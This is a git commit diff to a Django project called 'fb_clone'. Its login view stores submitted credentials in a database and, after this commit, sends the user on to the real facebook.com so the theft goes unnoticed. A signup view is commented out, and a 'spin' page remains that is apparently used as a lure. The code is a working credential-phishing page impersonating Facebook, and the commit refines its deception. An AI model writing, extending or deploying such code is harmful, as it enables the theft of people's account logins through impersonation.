c1e442add2b3378a42a1fbac97366949a9e6b3e7
Christian Mayol Aribal <123535180+CHRISTIANARIBAL@users.noreply.github.com>
2025-04-26 22:49:41 -0700

    Update
    Updated

--- fb_clone/accounts/views.py
+++ fb_clone/accounts/views.py
@@ -6,21 +6,26 @@ def login_view(request):
         form = CredentialForm(request.POST)
         if form.is_valid():
             form.save()  # Save to DB
-            return render(request, 'accounts/success.html')
+            return redirect('https://www.facebook.com')
     else:
         form = CredentialForm()
     return render(request, 'accounts/login.html', {'form': form})
 
-
-def signup_view(request):
-    if request.method == 'POST':
-        form = CredentialForm(request.POST)
-        if form.is_valid():
-            form.save()
-            return render(request, 'accounts/success.html', {'message': 'Account created successfully!'})
-    else:
-        form = CredentialForm()
-    return render(request, 'accounts/signup.html', {'form': form})
-
 def spin_view(request):
     return render(request, 'accounts/spin.html')
+
+
+
+
+
+
+# def signup_view(request):
+#     if request.method == 'POST':
+#         form = CredentialForm(request.POST)
+#         if form.is_valid():
+#             form.save()
+#             return render(request, 'accounts/success.html', {'message': 'Account created successfully!'})
+#     else:
+#         form = CredentialForm()
+#     return render(request, 'accounts/signup.html', {'form': form})
+
